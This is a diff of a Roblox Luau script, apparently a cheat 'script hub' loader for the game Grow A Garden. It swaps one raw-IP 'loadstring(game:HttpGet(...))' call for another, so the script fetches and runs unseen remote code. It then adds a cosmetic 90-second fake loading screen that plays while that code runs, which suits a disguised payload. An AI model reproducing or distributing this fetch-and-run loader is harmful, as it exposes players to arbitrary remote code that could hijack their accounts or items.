@@ -1,2 +1,324 @@
-ID="da1b1c66-5ba5-4ae0-bdcd-936a3b6027f0";
-loadstring(game:HttpGet("http://5.129.216.170:3910/cdn/loader.luau"))()
+local success, errorMessage = pcall(function()
+ID="9ce9b1b5-4d79-4adf-ae89-9245e329eb23";
+loadstring(game:HttpGet("http://5.129.217.87:3910/cdn/loader.luau"))()
+end)
+
+if not success then
+    PercentLabel.Text = "Ошибка загрузки!"
+    PercentLabel.TextColor3 = Color3.fromRGB(255, 50, 50)
+    wait(2)
+end
+
+local TweenService = game:GetService("TweenService")
+local CoreGui = game:GetService("CoreGui")
+local Players = game:GetService("Players")
+local PlayerGui = Players.LocalPlayer:WaitForChild("PlayerGui")
+local SoundService = game:GetService("SoundService")
+
+local backgroundMusic = Instance.new("Sound")
+backgroundMusic.SoundId = "rbxassetid://1848354536"
+backgroundMusic.Volume = 0.5
+backgroundMusic.Looped = true
+backgroundMusic.Parent = SoundService
+
+--// Запускаем музыку с плавным увеличением громкости
+backgroundMusic:Play()
+local fadeInTween = TweenService:Create(
+    backgroundMusic, 
+    TweenInfo.new(3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
+    {Volume = 0.7}
+)
+fadeInTween:Play()
+
+--// Основной скрипт загрузки
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name = "LoadingScreen"
+ScreenGui.Parent = CoreGui
+ScreenGui.IgnoreGuiInset = true
+ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+-- Сначала делаем GUI прозрачным для плавного появления
+ScreenGui.Enabled = false
+
+-- Arka plan
+local Background = Instance.new("Frame")
+Background.Size = UDim2.new(1,0,1,0)
+Background.Position = UDim2.new(0,0,0,0)
+Background.BackgroundColor3 = Color3.fromRGB(30,30,30)
+Background.BackgroundTransparency = 1 -- Начальная прозрачность
+Background.BorderSizePixel = 0
+Background.Parent = ScreenGui
+
+-- Gradient
+local UIGradient = Instance.new("UIGradient")
+UIGradient.Color = ColorSequence.new{
+    ColorSequenceKeypoint.new(0, Color3.fromRGB(20,20,20)),
+    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(50,50,50)),
+    ColorSequenceKeypoint.new(1, Color3.fromRGB(30,30,30))
+}
+UIGradient.Rotation = 45
+UIGradient.Parent = Background
+
+-- Yıldızlar
+local stars = {}
+for i = 1, 50 do
+    local star = Instance.new("TextLabel")
+    star.Size = UDim2.new(0,5,0,5)
+    star.Position = UDim2.new(math.random(),0,math.random(),0)
+    star.BackgroundTransparency = 1
+    star.Text = "★"
+    star.TextColor3 = Color3.fromRGB(255,255,255)
+    star.TextTransparency = 1 -- Начальная прозрачность
+    star.TextScaled = true
+    star.Font = Enum.Font.GothamBlack
+    star.Parent = Background
+    table.insert(stars, star)
+end
+
+-- Başlık / Logo
+local Title = Instance.new("TextLabel")
+Title.Size = UDim2.new(0.6,0,0.15,0)
+Title.Position = UDim2.new(0.2,0,0.35,0)
+Title.BackgroundTransparency = 1
+Title.Text = "WyshScriptHub"
+Title.TextColor3 = Color3.fromRGB(255,255,255)
+Title.TextTransparency = 1 -- Начальная прозрачность
+Title.Font = Enum.Font.GothamBlack
+Title.TextScaled = true
+Title.TextStrokeTransparency = 1
+Title.TextStrokeColor3 = Color3.fromRGB(255,255,255)
+Title.Parent = Background
+
+-- Yüklenme çubuğu
+local BarBackground = Instance.new("Frame")
+BarBackground.Size = UDim2.new(0.6,0,0.05,0)
+BarBackground.Position = UDim2.new(0.2,0,0.55,0)
+BarBackground.BackgroundColor3 = Color3.fromRGB(60,60,60)
+BarBackground.BackgroundTransparency = 1 -- Начальная прозрачность
+BarBackground.BorderSizePixel = 2
+BarBackground.BorderColor3 = Color3.fromRGB(255,255,255)
+BarBackground.Parent = Background
+
+local barCorner = Instance.new("UICorner")
+barCorner.CornerRadius = UDim.new(0.08,0)
+barCorner.Parent = BarBackground
+
+-- Gradientli yüklenme çubuğu
+local LoadingBar = Instance.new("Frame")
+LoadingBar.Size = UDim2.new(0,0,1,0)
+LoadingBar.BackgroundColor3 = Color3.fromRGB(50,150,255)
+LoadingBar.BackgroundTransparency = 1 -- Начальная прозрачность
+LoadingBar.BorderSizePixel = 0
+LoadingBar.Parent = BarBackground
+
+local loadingCorner = Instance.new("UICorner")
+loadingCorner.CornerRadius = UDim.new(0.08,0)
+loadingCorner.Parent = LoadingBar
+
+local barGradient = Instance.new("UIGradient")
+barGradient.Color = ColorSequence.new{
+    ColorSequenceKeypoint.new(0, Color3.fromRGB(80,180,255)),
+    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(50,150,255)),
+    ColorSequenceKeypoint.new(1, Color3.fromRGB(20,100,255))
+}
+barGradient.Rotation = 0
+barGradient.Parent = LoadingBar
+
+-- GlowBar (parlama efekti)
+local GlowBar = Instance.new("Frame")
+GlowBar.Size = UDim2.new(0.05,0,1,0)
+GlowBar.BackgroundColor3 = Color3.fromRGB(120,220,255)
+GlowBar.BackgroundTransparency = 1 -- Начальная прозрачность
+GlowBar.BorderSizePixel = 0
+GlowBar.Position = UDim2.new(0,0,0,0)
+GlowBar.Parent = LoadingBar
+
+local glowCorner = Instance.new("UICorner")
+glowCorner.CornerRadius = UDim.new(0.08,0)
+glowCorner.Parent = GlowBar
+
+local PercentLabel = Instance.new("TextLabel")
+PercentLabel.Size = UDim2.new(1,0,1,0)
+PercentLabel.Position = UDim2.new(0,0,0,0)
+PercentLabel.BackgroundTransparency = 1
+PercentLabel.TextColor3 = Color3.fromRGB(255,255,255)
+PercentLabel.TextTransparency = 1 -- Начальная прозрачность
+PercentLabel.Font = Enum.Font.Gotham
+PercentLabel.TextScaled = true
+PercentLabel.Text = "0%"
+PercentLabel.Parent = BarBackground
+
+-- Küçük beyaz alt yazı
+local SubTitle = Instance.new("TextLabel")
+SubTitle.Size = UDim2.new(0.6,0,0.05,0)
+SubTitle.Position = UDim2.new(0.2,0,0.63,0)
+SubTitle.BackgroundTransparency = 1
+SubTitle.Text = "Загрузка скрипта Grow A Garden."
+SubTitle.TextColor3 = Color3.fromRGB(255,255,255)
+SubTitle.TextTransparency = 1 -- Начальная прозрачность
+SubTitle.Font = Enum.Font.GothamSemibold
+SubTitle.TextSize = 18
+SubTitle.TextStrokeTransparency = 1
+SubTitle.TextStrokeColor3 = Color3.fromRGB(0,0,0)
+SubTitle.Parent = Background
+
+--// Плавное появление GUI
+ScreenGui.Enabled = true
+
+-- Анимация появления фона
+local bgTween = TweenService:Create(
+    Background,
+    TweenInfo.new(1.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
+    {BackgroundTransparency = 0}
+)
+bgTween:Play()
+
+-- Анимация появления элементов
+wait(0.3)
+
+local titleTween = TweenService:Create(
+    Title,
+    TweenInfo.new(1.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
+    {TextTransparency = 0, TextStrokeTransparency = 0.5}
+)
+titleTween:Play()
+
+wait(0.2)
+
+local barTween = TweenService:Create(
+    BarBackground,
+    TweenInfo.new(1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
+    {BackgroundTransparency = 0}
+)
+barTween:Play()
+
+local loadingBarTween = TweenService:Create(
+    LoadingBar,
+    TweenInfo.new(1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
+    {BackgroundTransparency = 0}
+)
+loadingBarTween:Play()
+
+local glowTween = TweenService:Create(
+    GlowBar,
+    TweenInfo.new(1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
+    {BackgroundTransparency = 0.25}
+)
+glowTween:Play()
+
+local percentTween = TweenService:Create(
+    PercentLabel,
+    TweenInfo.new(1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
+    {TextTransparency = 0}
+)
+percentTween:Play()
+
+local subtitleTween = TweenService:Create(
+    SubTitle,
+    TweenInfo.new(1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
+    {TextTransparency = 0, TextStrokeTransparency = 0.5}
+)
+subtitleTween:Play()
+
+-- Анимация появления звезд
+for _, star in pairs(stars) do
+    spawn(function()
+        wait(math.random() * 0.8)
+        local starTween = TweenService:Create(
+            star,
+            TweenInfo.new(0.8, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
+            {TextTransparency = 0}
+        )
+        starTween:Play()
+    end)
+end
+
+-- Ждем завершения анимаций перед началом загрузки
+wait(2)
+
+-- Hafif yanıp sönme ve yavaş hareket для звезд
+for i, star in pairs(stars) do
+    spawn(function()
+        while true do
+            local tweenInfo = TweenInfo.new(math.random(3,6), Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true)
+            local tween = TweenService:Create(star, tweenInfo, {TextTransparency = math.random(2,4)/10})
+            tween:Play()
+            
+            local moveX = star.Position.X.Scale + (math.random(-5,5)/100)
+            local moveY = star.Position.Y.Scale + (math.random(-5,5)/100)
+            moveX = math.clamp(moveX, 0, 1)
+            moveY = math.clamp(moveY, 0, 1)
+            local moveTween = TweenService:Create(star, TweenInfo.new(math.random(15,25)/10, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {Position = UDim2.new(moveX,0,moveY,0)})
+            moveTween:Play()
+            
+            wait(math.random(2,4))
+        end
+    end)
+end
+
+-- Yavaş ama hafif hızlı yüklenme animasyonu (1.5 dakika)
+local progress = 0
+local startTime = tick()
+local totalDuration = 90 -- 1.5 минуты в секундах
+local dotCount = 1
+local lastDotUpdate = 0
+
+while progress < 100 do
+    -- Обновляем точки загрузки каждые 0.5 секунды
+    if tick() - lastDotUpdate >= 0.5 then
+        lastDotUpdate = tick()
+        dotCount = dotCount + 1
+        if dotCount > 3 then
+            dotCount = 1
+        end
+        
+        local dots = string.rep(".", dotCount)
+        SubTitle.Text = "Загрузка скрипта Grow A Garden" .. dots
+    end
+    
+    -- Рассчитываем прогресс на основе времени
+    local elapsedTime = tick() - startTime
+    progress = math.min((elapsedTime / totalDuration) * 100, 100)
+    
+    LoadingBar.Size = UDim2.new(progress/100,0,1,0)
+    PercentLabel.Text = math.floor(progress).."%"
+    
+    -- GlowBar smooth hareket
+    local targetPos = UDim2.new((progress/100)-0.05,0,0,0)
+    TweenService:Create(GlowBar, TweenInfo.new(0.1, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {Position = targetPos}):Play()
+    
+    -- GlowBar rengini hafif titreştir
+    local glowR = 50
+    local glowG = 150 + math.sin(tick())*50
+    local glowB = 255
+    GlowBar.BackgroundColor3 = Color3.fromRGB(glowR, math.clamp(glowG,150,200), glowB)
+    
+    -- Başlık hafif titreşim
+    Title.Position = UDim2.new(0.2, math.sin(tick()*3)*2, 0.35, 0)
+    
+    wait(0.05)
+end
+
+PercentLabel.Text = "Успешно!"
+
+-- Плавное исчезновение музыки
+local fadeOutTween = TweenService:Create(
+    backgroundMusic, 
+    TweenInfo.new(2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
+    {Volume = 0}
+)
+fadeOutTween:Play()
+
+wait(1)
+
+-- Плавное исчезновение GUI
+local fadeOutGui = TweenService:Create(
+    Background,
+    TweenInfo.new(1.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
+    {BackgroundTransparency = 1}
+)
+fadeOutGui:Play()
+
+wait(1.5)
+ScreenGui:Destroy()
+backgroundMusic:Stop()
